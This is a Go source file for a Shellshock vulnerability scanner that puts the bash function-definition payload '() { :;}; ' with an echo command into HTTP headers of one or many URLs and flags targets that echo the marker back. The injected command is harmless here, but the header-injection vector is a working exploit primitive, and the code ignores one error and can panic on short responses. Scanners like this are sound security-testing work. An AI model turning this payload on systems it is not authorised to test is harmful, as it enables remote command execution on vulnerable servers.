package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"reflect"
	"sync"
	"time"
)

const (
	PAYLOAD_PREFIX = "() { :;}; "
	PAYLOAD_ECHO   = `echo "Content-Type": "text/html"; echo; echo 'oh noes, vuln'`
)

var client http.Client

type result struct {
	url        string
	vulnerable bool
}

func main() {
	url := flag.String("url", "", "The URL to check.")
	verbose := flag.Bool("verbose", false, "If true, the response body will be printed.")
	stdin := flag.Bool("stdin", false, "If true, a list of URLs to check is read from Stdin.")
	timeout := flag.Int("timeout", 10, "How long to wait for a response before giving up.")
	workers := flag.Int("workers", 5, "The number of concurrent requests to make.")
	flag.Parse()
	client = http.Client{Timeout: time.Second * time.Duration(*timeout)}
	if *url != "" {
		bashOne(*url, *verbose)
		return
	}
	if !*stdin {
		flag.Usage()
		return
	}
	work := make(chan string)
	var wg sync.WaitGroup
	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			work <- scanner.Text()
		}
		close(work)
	}()
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go bashMany(*verbose, work, &wg)
	}
	wg.Wait()
}

func setHeaders(r *http.Request) *http.Request {
	headers := []string{"User-Agent", "Host", "Cookie", "Referer"}
	for _, v := range headers {
		r.Header.Set(v, PAYLOAD_PREFIX+PAYLOAD_ECHO)
	}
	return r
}

func bashit(url string, verbose bool) (bool, error) {
	req, err := http.NewRequest("GET", url, nil)
	setHeaders(req)
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	if resp.StatusCode == http.StatusNotFound {
		return false, fmt.Errorf("%s returned status code 404 (not found)", url)
	}
	if verbose {
		fmt.Printf("%s\n", body)
	}
	if reflect.DeepEqual(body[:13], []byte("oh noes, vuln")) {
		return true, nil
	}
	return false, nil
}

func bashOne(url string, verbose bool) {
	vuln, err := bashit(url, verbose)
	if err != nil {
		log.Fatal(err)
	}
	if vuln {
		fmt.Printf("%s appears vulnerable to shellshock.\n", url)
	} else {
		fmt.Printf("%s does not appear vulnerable to shellshock.\n", url)
	}
}

func bashMany(verbose bool, work chan string, wg *sync.WaitGroup) {
	for url := range work {
		vuln, err := bashit(url, verbose)
		if err != nil {
			log.Println(err)
			continue
		}
		if vuln {
			fmt.Println(url)
		}
	}
	wg.Done()
}
